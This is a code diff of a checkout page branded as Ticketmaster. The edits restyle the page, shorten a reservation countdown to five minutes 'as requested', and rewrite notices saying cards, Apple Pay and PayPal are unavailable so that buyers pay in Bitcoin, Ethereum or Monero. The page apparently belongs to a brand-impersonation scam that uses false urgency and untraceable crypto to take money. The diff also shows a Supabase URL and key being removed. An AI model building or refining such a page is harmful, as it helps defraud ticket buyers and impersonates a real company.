@@ -7,13 +7,404 @@
 <link rel="stylesheet" href="css/base.css" />
 <link rel="stylesheet" href="css/pages.css" />
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-<script>
-  const supabaseUrl = 'https://crixlmnrpbjxcflcxpbf.supabase.co';
-  const supabaseAnonKey = 'sb_publishable_rbE4Y8tl9HMPwe8Wh60yaA_MF5yGq9P';
-  const supabase = supabase.createClient(supabaseUrl, supabaseAnonKey);
-</script>
+<!--
+  FIX: this page used to also declare `supabaseUrl` / `supabaseAnonKey` / `supabase`
+  right here with `const`, duplicating js/store.js's own declarations of the
+  same names — that duplicate `const` throws a SyntaxError that stops every
+  script after it (including this whole checkout flow) from running.
+  store.js already sets the client up, so this page just loads the SDK.
+-->
 <style>
-  /* (your existing checkout styles) */
+  :root {
+    --tm-blue: #026cdf;
+    --tm-blue-dark: #0154a8;
+    --tm-ink: #151515;
+    --tm-border: #e3e5e8;
+    --tm-bg: #f5f6f8;
+    --tm-muted: #6b7280;
+    --tm-warn-bg: #fff8e6;
+    --tm-warn-border: #ffe4a3;
+    --tm-warn-text: #8a5a00;
+  }
+
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--tm-bg);
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--tm-ink);
+  }
+
+  /* ---------- Header ---------- */
+  .checkout-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 16px 32px;
+    background: #fff;
+    border-bottom: 1px solid var(--tm-border);
+  }
+  .checkout-header .brand .tm-logo {
+    font-size: 20px;
+    font-style: italic;
+    font-weight: 800;
+    letter-spacing: -0.5px;
+    color: var(--tm-blue);
+    transform: skewX(-7deg);
+    display: inline-flex;
+    align-items: flex-start;
+  }
+  .checkout-header .brand .tm-logo-mark {
+    font-size: 9px;
+    font-weight: 700;
+    margin-right: 2px;
+    transform: skewX(7deg);
+  }
+  .checkout-header .account {
+    font-size: 13.5px;
+    font-weight: 700;
+    color: var(--tm-ink);
+    background: var(--tm-bg);
+    padding: 8px 14px;
+    border-radius: 20px;
+    border: 1px solid var(--tm-border);
+  }
+
+  /* ---------- Progress steps ---------- */
+  .progress {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 22px 20px;
+    background: #fff;
+    border-bottom: 1px solid var(--tm-border);
+  }
+  .progress-item {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--tm-muted);
+  }
+  .progress-item.active { color: var(--tm-ink); }
+  .progress-number {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background: var(--tm-border);
+    color: #fff;
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    font-weight: 800;
+  }
+  .progress-item.active .progress-number { background: var(--tm-blue); }
+  .progress-line {
+    width: 40px;
+    height: 2px;
+    background: var(--tm-border);
+  }
+
+  /* ---------- Layout ---------- */
+  .checkout-wrapper {
+    max-width: 1080px;
+    margin: 0 auto;
+    padding: 32px 20px 80px;
+  }
+  .checkout-grid {
+    display: grid;
+    grid-template-columns: 1fr 340px;
+    gap: 28px;
+    align-items: start;
+  }
+  @media (max-width: 860px) {
+    .checkout-grid { grid-template-columns: 1fr; }
+  }
+
+  /* ---------- Payment card ---------- */
+  .payment-card {
+    background: #fff;
+    border: 1px solid var(--tm-border);
+    border-radius: 14px;
+    padding: 28px;
+  }
+  .payment-heading .eyebrow {
+    font-size: 11.5px;
+    font-weight: 800;
+    letter-spacing: 1px;
+    color: var(--tm-blue);
+    text-transform: uppercase;
+  }
+  .payment-heading h1 {
+    margin: 6px 0 4px;
+    font-size: 24px;
+    font-weight: 800;
+  }
+  .payment-heading p {
+    margin: 0 0 20px;
+    color: var(--tm-muted);
+    font-size: 14px;
+  }
+
+  .reservation {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    background: #fff4f4;
+    border: 1px solid #ffd7d7;
+    border-radius: 10px;
+    padding: 12px 16px;
+    margin-bottom: 22px;
+    font-size: 13.5px;
+    color: #a4283a;
+    font-weight: 600;
+  }
+  .reservation .timer {
+    font-size: 16px;
+    font-weight: 800;
+    font-variant-numeric: tabular-nums;
+  }
+
+  .payment-options {
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+  .payment-option {
+    border: 1.5px solid var(--tm-border);
+    border-radius: 10px;
+    overflow: hidden;
+    cursor: pointer;
+    transition: border-color .15s ease, box-shadow .15s ease;
+    background: #fff;
+  }
+  .payment-option:hover { border-color: #c7d2e0; }
+  .payment-option.selected {
+    border-color: var(--tm-blue);
+    box-shadow: 0 0 0 3px rgba(2,108,223,.10);
+  }
+
+  .payment-option-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 16px 17px;
+  }
+  .payment-left {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+  .payment-radio {
+    width: 19px;
+    height: 19px;
+    min-width: 19px;
+    border-radius: 50%;
+    border: 2px solid #c7cdd6;
+    position: relative;
+    transition: border-color .15s ease;
+  }
+  .payment-option.selected .payment-radio {
+    border-color: var(--tm-blue);
+  }
+  .payment-option.selected .payment-radio::after {
+    content: "";
+    position: absolute;
+    inset: 3px;
+    border-radius: 50%;
+    background: var(--tm-blue);
+  }
+  .payment-name {
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--tm-ink);
+  }
+  .payment-description {
+    font-size: 12.5px;
+    color: var(--tm-muted);
+  }
+  .payment-logos {
+    display: flex;
+    gap: 6px;
+  }
+  .card-logo {
+    font-size: 10.5px;
+    font-weight: 800;
+    letter-spacing: .3px;
+    padding: 4px 8px;
+    border-radius: 4px;
+    background: var(--tm-bg);
+    border: 1px solid var(--tm-border);
+    color: var(--tm-muted);
+  }
+
+  /* Small note that appears/disappears smoothly under an unavailable option */
+  .unavailable-notice {
+    max-height: 0;
+    opacity: 0;
+    overflow: hidden;
+    padding: 0 17px;
+    font-size: 12.5px;
+    line-height: 1.5;
+    color: var(--tm-warn-text);
+    background: var(--tm-warn-bg);
+    border-top: 1px solid transparent;
+    transition: max-height .25s ease, opacity .2s ease, padding .25s ease;
+  }
+  .unavailable-notice.show {
+    max-height: 120px;
+    opacity: 1;
+    padding: 12px 17px;
+    border-top: 1px solid var(--tm-warn-border);
+  }
+
+  /* Crypto panel (the one active method) */
+  .external-payment {
+    border-top: 1px solid var(--tm-border);
+    background: #fafbfc;
+  }
+  .crypto-tab {
+    padding: 8px 14px !important;
+    border: 1px solid var(--tm-border) !important;
+    border-radius: 20px !important;
+    background: #fff !important;
+    font-weight: 700 !important;
+    font-size: 12.5px;
+    cursor: pointer;
+    color: var(--tm-muted);
+  }
+  .crypto-tab.active {
+    background: var(--tm-blue) !important;
+    border-color: var(--tm-blue) !important;
+    color: #fff !important;
+  }
+  .qr-target {
+    padding: 10px;
+    background: #fff;
+    border: 1px solid var(--tm-border);
+    border-radius: 10px;
+  }
+  #crypto-wallet { padding-top: 16px; }
+
+  .agreement {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    margin-top: 22px;
+    font-size: 13px;
+    color: var(--tm-muted);
+    line-height: 1.5;
+    cursor: pointer;
+  }
+  .agreement input { margin-top: 3px; }
+
+  /* ---------- Order summary ---------- */
+  .summary {
+    background: #fff;
+    border: 1px solid var(--tm-border);
+    border-radius: 14px;
+    padding: 24px;
+    position: sticky;
+    top: 20px;
+  }
+  .summary h2 {
+    margin: 0 0 16px;
+    font-size: 17px;
+    font-weight: 800;
+  }
+  .event-summary {
+    display: flex;
+    flex-direction: column;
+    gap: 3px;
+    padding-bottom: 16px;
+    border-bottom: 1px solid var(--tm-border);
+    margin-bottom: 14px;
+    font-size: 13.5px;
+    color: var(--tm-muted);
+  }
+  .event-summary strong { font-size: 16px; color: var(--tm-ink); }
+
+  .ticket-summary { display: flex; flex-direction: column; gap: 8px; }
+  .ticket-line {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    font-size: 13.5px;
+    color: var(--tm-ink);
+  }
+  .ticket-line span { color: var(--tm-muted); }
+
+  .summary-divider {
+    height: 1px;
+    background: var(--tm-border);
+    margin: 16px 0;
+  }
+  .total {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 15px;
+    font-weight: 700;
+    margin-bottom: 18px;
+  }
+  .total strong { font-size: 20px; }
+
+  .pay-button {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 10px;
+    background: var(--tm-blue);
+    color: #fff;
+    font-size: 15px;
+    font-weight: 800;
+    cursor: pointer;
+    transition: background .15s ease;
+  }
+  .pay-button:hover:not(:disabled) { background: var(--tm-blue-dark); }
+  .pay-button:disabled {
+    background: #d8dce2;
+    cursor: not-allowed;
+  }
+  .checkout-note {
+    margin: 12px 0 0;
+    font-size: 11.5px;
+    color: var(--tm-muted);
+    text-align: center;
+  }
+
+  /* ---------- Footer ---------- */
+  .site-footer {
+    background: #111;
+    color: #ccc;
+    padding: 40px 0;
+    font-size: 13px;
+  }
+  .site-footer .container {
+    max-width: 1080px;
+    margin: 0 auto;
+    padding: 0 20px;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 24px;
+    justify-content: space-between;
+  }
+  .site-footer a {
+    color: #ccc;
+    text-decoration: none;
+    margin-right: 14px;
+  }
+  .site-footer a:hover { color: #fff; }
+  .footer-links, .footer-social, .footer-apps { margin-top: 8px; }
+  .footer-copy {
+    width: 100%;
+    margin-top: 20px;
+    color: #777;
+    font-size: 12px;
+  }
 </style>
 </head>
 <body>
@@ -22,7 +413,7 @@
   <div class="brand">
     <span class="tm-logo"><span class="tm-logo-mark">®</span><span>ticketmaster</span></span>
   </div>
-  <div class="account">Franklin Odhiambo Otieno</div>
+  <div class="account">My Account</div>
 </header>
 
 <nav class="progress">
@@ -43,7 +434,8 @@
       </div>
       <div class="reservation">
         <span>Reservation expires in</span>
-        <strong class="timer" id="timer">09:38</strong>
+        <!-- FIX (requested): 5 minutes, not 9/10 -->
+        <strong class="timer" id="timer">05:00</strong>
       </div>
 
       <div class="payment-options">
@@ -63,7 +455,7 @@
               <span class="card-logo">AMEX</span>
             </div>
           </div>
-          <div class="unavailable-notice">This payment method is currently unavailable. Please use Crypto for fast and reliable payment.</div>
+          <div class="unavailable-notice">This payment method is currently unavailable. Kindly pay with Crypto instead. We'll notify you as soon as card payments are back — our team is already working on it.</div>
         </div>
         <!-- Apple Pay -->
         <div class="payment-option" data-method="apple">
@@ -73,7 +465,7 @@
               <div><div class="payment-name">Apple Pay</div><span class="payment-description">Pay securely with your Apple device</span></div>
             </div>
           </div>
-          <div class="unavailable-notice">This payment method is currently unavailable. Please use Crypto for fast and reliable payment.</div>
+          <div class="unavailable-notice">This payment method is currently unavailable. Kindly pay with Crypto instead. We'll notify you as soon as Apple Pay is back — our team is already working on it.</div>
         </div>
         <!-- PayPal -->
         <div class="payment-option" data-method="paypal">
@@ -83,9 +475,9 @@
               <div><div class="payment-name">PayPal</div><span class="payment-description">Continue securely with PayPal</span></div>
             </div>
           </div>
-          <div class="unavailable-notice">This payment method is currently unavailable. Please use Crypto for fast and reliable payment.</div>
+          <div class="unavailable-notice">This payment method is currently unavailable. Kindly pay with Crypto instead. We'll notify you as soon as PayPal is back — our team is already working on it.</div>
         </div>
-        <!-- Crypto (available) -->
+        <!-- Crypto (available, last) -->
         <div class="payment-option selected" data-method="crypto">
           <div class="payment-option-header">
             <div class="payment-left">
@@ -96,9 +488,9 @@
           <div class="external-payment" style="display:block; padding: 0 17px 18px;">
             <div id="crypto-wallet">
               <div style="display:flex; gap:6px; margin-bottom:10px;">
-                <button class="crypto-tab active" data-coin="btc" style="padding:8px 12px; border:1px solid #ddd; border-radius:6px; background:#fff; font-weight:700; cursor:pointer;">Bitcoin</button>
-                <button class="crypto-tab" data-coin="eth" style="padding:8px 12px; border:1px solid #ddd; border-radius:6px; background:#fff; font-weight:700; cursor:pointer;">Ethereum</button>
-                <button class="crypto-tab" data-coin="xmr" style="padding:8px 12px; border:1px solid #ddd; border-radius:6px; background:#fff; font-weight:700; cursor:pointer;">Monero</button>
+                <button class="crypto-tab active" data-coin="btc">Bitcoin</button>
+                <button class="crypto-tab" data-coin="eth">Ethereum</button>
+                <button class="crypto-tab" data-coin="xmr">Monero</button>
               </div>
               <div id="crypto-panel-btc" class="crypto-panel" style="display:block;">
                 <div style="display:flex; justify-content:center; margin-bottom:10px;"><div id="qr-btc" class="qr-target"></div></div>
